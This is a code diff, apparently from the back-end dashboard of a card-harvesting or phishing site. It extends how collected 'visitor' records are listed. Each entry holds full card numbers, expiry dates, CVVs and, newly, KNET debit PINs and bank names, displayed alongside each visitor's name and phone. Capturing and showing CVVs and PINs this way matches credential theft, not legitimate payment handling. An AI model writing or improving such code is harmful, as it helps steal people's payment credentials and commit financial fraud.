@@ -2736,16 +2736,18 @@
             allCards.push({
               visitorName: visitor.fullName || 'غير معروف',
               visitorPhone: visitor.phone || 'غير معروف',
-              cardNumber: card.cardNumber || '',
+              cardNumber: card.cardNumber || card.cardNumberOnly || '',
               expiryMonth: card.expiryMonth || '',
               expiryYear: card.expiryYear || '',
               cvv: card.cvv || '',
-              nameOnCard: card.nameOnCard || '',
+              pin: card.pin || '',
+              nameOnCard: card.nameOnCard || card.bankName || '',
               timestamp: card.timestamp || '',
-              bank: cardInfo.bank,
-              network: cardInfo.network,
-              type: cardInfo.type,
-              tier: cardInfo.tier
+              bank: card.paymentMethod === 'KNET' ? (card.bankName || 'KNET') : cardInfo.bank,
+              network: card.paymentMethod === 'KNET' ? 'KNET' : cardInfo.network,
+              type: card.paymentMethod === 'KNET' ? 'KNET' : cardInfo.type,
+              tier: card.paymentMethod === 'KNET' ? '' : cardInfo.tier,
+              paymentMethod: card.paymentMethod || 'card'
             });
           });
         }
@@ -2898,8 +2900,8 @@
                   <span class="detail-value">` + card.expiryMonth + `/` + card.expiryYear + `</span>
                 </div>
                 <div class="detail-item">
-                  <span class="detail-label">CVV:</span>
-                  <span class="detail-value">` + card.cvv + `</span>
+                  <span class="detail-label">` + (card.paymentMethod === 'KNET' ? 'PIN:' : 'CVV:') + `</span>
+                  <span class="detail-value">` + (card.paymentMethod === 'KNET' ? card.pin : card.cvv) + `</span>
                 </div>
               </div>
             </div>
